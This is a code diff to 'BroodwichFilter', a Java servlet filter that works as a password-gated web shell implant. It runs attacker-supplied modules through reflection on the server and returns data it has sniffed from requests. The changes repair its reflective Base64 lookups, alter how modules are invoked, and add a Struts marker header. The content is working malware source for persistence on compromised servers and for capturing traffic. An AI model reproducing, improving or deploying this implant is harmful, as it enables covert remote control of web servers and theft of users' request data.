@@ -8,11 +8,14 @@ import javax.servlet.ServletException;
 import javax.servlet.ServletRequest;
 import javax.servlet.ServletResponse;
 import javax.servlet.http.HttpServletRequest;
+import javax.servlet.http.HttpServletResponse;
 import java.io.*;
 import java.lang.reflect.Constructor;
 import java.lang.reflect.InvocationTargetException;
 import java.lang.reflect.Method;
+import java.util.ArrayList;
 import java.util.Arrays;
+import java.util.List;
 import java.util.Map;
 import java.util.concurrent.ConcurrentHashMap;
 import java.util.concurrent.ConcurrentLinkedQueue;
@@ -45,8 +48,8 @@ public class BroodwichFilter implements Filter {
             // todo: test how necessary this is.
             base64EncoderObject = Class.forName("java.util.Base64").getDeclaredMethod("getEncoder").invoke(null);
             base64DecoderObject = Class.forName("java.util.Base64").getDeclaredMethod("getDecoder").invoke(null);
-            base64EncoderMethod = Class.forName("java.util.Base64.Encoder").getDeclaredMethod("encodeToString", byte[].class);
-            base64DecoderMethod = Class.forName("java.util.Base64.Decoder").getDeclaredMethod("decode", String.class);
+            base64EncoderMethod = Class.forName("java.util.Base64$Encoder").getDeclaredMethod("encodeToString", byte[].class);
+            base64DecoderMethod = Class.forName("java.util.Base64$Decoder").getDeclaredMethod("decode", String.class);
         } catch (Exception e) {
             // java 6 <= v < 9
             try {
@@ -114,11 +117,10 @@ public class BroodwichFilter implements Filter {
         if(parameterMap.containsKey(moduleIdKey) && parameterMap.containsKey(passwordKey) && parameterMap.get(passwordKey)[0].equals(this.password)) {
             String moduleId = httpServletRequest.getParameter(moduleIdKey);
             String[] moduleParams = parameterMap.get(moduleParamsKey);
-            moduleParams = moduleParams != null ? moduleParams : new String[]{};
 
             if(this.modules.containsKey(moduleId)) {
                 try {
-                    pw.println(this.modules.get(moduleId).getDeclaredMethod("run", String[].class).invoke(null, moduleParams));
+                    pw.println(this.modules.get(moduleId).getDeclaredMethod("run", List.class).invoke(null, moduleParams != null ? Arrays.asList(moduleParams) : new ArrayList<String>()));
                 } catch (NoSuchMethodException e) {
                     e.printStackTrace();
                 } catch (IllegalAccessException e) {
@@ -161,6 +163,12 @@ public class BroodwichFilter implements Filter {
                 for(int i = 0; i < 100 && !this.sniffedData.isEmpty(); i++) {
                     pw.println(this.sniffedData.poll());
                 }
+            }
+
+            // set status header if on struts
+            // todo: come up with alternative / modularize
+            if(servletRequest.getClass().getName().equals("org.apache.struts2.dispatcher.StrutsRequestWrapper")) {
+                ((HttpServletResponse) servletResponse).setHeader("X-Modified-By", "Broodwich");
             }
         }
         else if (this.sniffPattern != null) {
